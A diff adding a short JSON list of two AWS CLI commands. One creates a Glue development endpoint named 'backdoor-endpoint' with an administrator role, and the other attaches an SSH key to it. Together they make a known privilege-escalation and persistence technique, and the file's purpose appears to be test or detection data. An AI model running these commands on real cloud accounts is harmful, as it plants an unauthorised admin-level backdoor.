@@ -1,0 +1,4 @@
+[
+  "aws glue create-dev-endpoint --endpoint-name backdoor-endpoint --role-arn arn:aws:iam::ACCOUNT:role/AdminRole --number-of-nodes 1",
+  "aws glue update-dev-endpoint --endpoint-name backdoor-endpoint --public-keys 'ssh-rsa AAAA...'"
+]
